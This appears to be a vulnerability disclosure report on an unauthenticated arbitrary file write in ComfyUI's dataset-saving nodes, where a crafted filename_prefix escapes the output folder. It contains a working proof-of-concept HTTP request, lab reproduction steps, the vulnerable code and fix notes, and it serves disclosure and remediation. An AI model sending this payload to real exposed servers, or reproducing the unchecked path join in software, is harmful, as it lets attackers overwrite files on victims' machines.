### Vulnerability details

**Official website / Product:** https://github.com/Comfy-Org/ComfyUI

**Repository:** Comfy-Org/ComfyUI (stars at selection: 144654)

**Vulnerability type:** file_upload (arbitrary file write / AFW)

**Vulnerability versions:** 0.43.0 (commit `384577510969e0ed59506f8eb5fcf6e6df15a3d1`, master; residual after CVE-2026-92816, still affected on ≥0.30.0)

**Vulnerability URL / Parameter:** `POST /prompt` → built-in nodes `SaveImageTextDataSetToFolder` / `SaveImageDataSetToFolder` parameter `filename_prefix` when `mode=overwrite` (default)

**Complex:** yes

**Authentication:** None by default. When the server is exposed with `--listen 0.0.0.0`, an unauthenticated client can submit a `/prompt` workflow and trigger this AFW.

### Verification procedure

1. **Rebuild the lab** (campaign path `labs/comfyui-r73-a4/`, compose still present; the original bind-mount source may be gone — check out the same commit yourself):
   ```bash
   git clone https://github.com/Comfy-Org/ComfyUI.git /tmp/ComfyUI-r73a4
   cd /tmp/ComfyUI-r73a4 && git checkout 384577510969e0ed59506f8eb5fcf6e6df15a3d1
   cd /path/to/campaign/labs/comfyui-r73-a4
   # Point the first volumes entry in docker-compose.yml to:
   #   /tmp/ComfyUI-r73a4:/root/ComfyUI
   docker compose up -d
   # Image yanwk/comfyui-boot:cpu-20261102; container name comfyui-r73-a4;
   # host **25304** → container 8188; CLI: --listen 0.0.0.0 --port 8188 --cpu --disable-all-custom-nodes
   ```
2. Probe and confirm version (**no credentials**):
   ```bash
   curl -sS http://127.0.0.1:25304/system_stats
   # Expect "comfyui_version": "0.43.0"
   ```
3. Send the full `POST /prompt` below: `EmptyImage` → `PrimitiveString` (attacker-controlled text) → `SaveImageTextDataSetToFolder` with safe `folder_name=dataset`, `filename_prefix=/tmp/r73a4_afw_final`, `mode=overwrite`.
4. Response is HTTP 200 with empty `node_errors`.
5. Confirm arbitrary write inside the container:
   ```bash
   docker exec comfyui-r73-a4 ls -la /tmp/r73a4_afw_final_00000.png /tmp/r73a4_afw_final_00000.txt
   docker exec comfyui-r73-a4 cat /tmp/r73a4_afw_final_00000.txt
   ```
   Expected output:
   ```
   -rw-r--r-- 1 root root 76 Nov  2 20:02 /tmp/r73a4_afw_final_00000.png
   -rw-r--r-- 1 root root 26 Nov  2 20:02 /tmp/r73a4_afw_final_00000.txt
   r73a4-AFW-FINAL-1793649762
   ```
6. Controls:
   - Absolute `folder_name=/tmp/...` is rejected by `secure_subfolder_path` (`Invalid folder name`; CVE-2026-92816 fix);
   - `mode=increment` with an absolute `filename_prefix` is rejected by `get_save_image_path` (“Saving image outside the output folder”) — only the **overwrite** branch remains vulnerable.

Compose reference (`labs/comfyui-r73-a4/docker-compose.yml`):

```yaml
services:
  comfyui:
    image: yanwk/comfyui-boot:cpu-20261102
    container_name: comfyui-r73-a4
    ports:
      - "25304:8188"
    environment:
      - CLI_ARGS=--listen 0.0.0.0 --port 8188 --cpu --disable-all-custom-nodes
    volumes:
      - /tmp/ComfyUI-r73a4:/root/ComfyUI
      - ./data/input:/root/ComfyUI/input
      - ./data/output:/root/ComfyUI/output
      - ./data/user:/root/ComfyUI/user
      - ./data/user-scripts:/root/user-scripts
    restart: "no"
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /prompt HTTP/1.1
Host: 127.0.0.1:25304
Content-Type: application/json
Content-Length: 402
Connection: close

{"prompt": {"1": {"class_type": "EmptyImage", "inputs": {"width": 8, "height": 8, "batch_size": 1, "color": 65280}}, "2": {"class_type": "PrimitiveString", "inputs": {"value": "r73a4-AFW-FINAL-1793649762"}}, "3": {"class_type": "SaveImageTextDataSetToFolder", "inputs": {"images": ["1", 0], "texts": ["2", 0], "folder_name": "dataset", "filename_prefix": "/tmp/r73a4_afw_final", "mode": "overwrite"}}}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 85
Date: Mon, 02 Nov 2026 20:02:42 GMT
Server: Python/3.13 aiohttp/3.14.5

{"prompt_id": "22f4016e-869f-4d53-bb62-6875f352449e", "number": 3, "node_errors": {}}
```

Verification result notes:

Inside the container (paths outside the configured output directory):

- `/tmp/r73a4_afw_final_00000.png` (76 bytes; attacker-influenced EmptyImage color block)
- `/tmp/r73a4_afw_final_00000.txt` contains `r73a4-AFW-FINAL-1793649762` (fully attacker-controlled text)

Observed impact (in-container `ls`/`cat`):

```
=== impact ===
-rw-r--r-- 1 root root 76 Nov  2 20:02 /tmp/r73a4_afw_final_00000.png
-rw-r--r-- 1 root root 26 Nov  2 20:02 /tmp/r73a4_afw_final_00000.txt
---
r73a4-AFW-FINAL-1793649762
```

Satisfies the campaign file_upload rule (attacker-controlled content written to an unexpected path). Relative `../` prefixes likewise escape the dataset subfolder confined by `secure_subfolder_path`. `SaveImageDataSetToFolder` (no captions) is affected by the same overwrite branch and writes only the PNG.

### Vulnerability analysis

After CVE-2026-92816, `folder_name` is confined with `secure_subfolder_path()`. However, `save_images_to_folder()` in the **overwrite** (default) branch builds:

`filename = f"{prefix}_{idx:05d}.png"` then `os.path.join(output_dir, filename)` and `img.save` / caption `open(...).write(caption)` **without** calling `get_save_image_path()` or `is_within_directory()`.

On Unix, an absolute `prefix` causes `os.path.join` to discard `output_dir`, writing anywhere the process can write; `../` sequences also escape. `SaveImageTextDataSetToFolder` additionally writes attacker-controlled `texts` to the escaped `.txt` path, which is stronger than image-only AFW.

Trigger / sink source (full path and line numbers):

```python
# File: comfy_extras/nodes_dataset.py
# Lines: 435-441, 544-553
        if overwrite:
            filename = f"{prefix}_{idx:05d}.png"
        else:
            _, _, counter, _, resolved_prefix = folder_paths.get_save_image_path(prefix, output_dir)
            filename = f"{resolved_prefix}_{counter:05}_{idx:05d}.png"
        filepath = os.path.join(output_dir, filename)
        img.save(filepath)
        ...
        output_dir = secure_subfolder_path(folder_paths.get_output_directory(), folder_name)
        saved_files = save_images_to_folder(images, output_dir, filename_prefix, mode=='overwrite')
        if texts:
            for idx, (filename, caption) in enumerate(zip(saved_files, texts)):
                caption_filename = filename.replace(".png", ".txt")
                caption_path = os.path.join(output_dir, caption_filename)
                with open(caption_path, "w", encoding="utf-8") as f:
                    f.write(caption)
```

### Fix notes

Route overwrite through the same `folder_paths.get_save_image_path()` (or equivalent `is_within_directory` / `realpath`) path used by increment mode; never join the raw prefix. Re-validate caption destinations before write. Prefer forcing `os.path.basename` on the prefix or rejecting absolute paths and `..`.
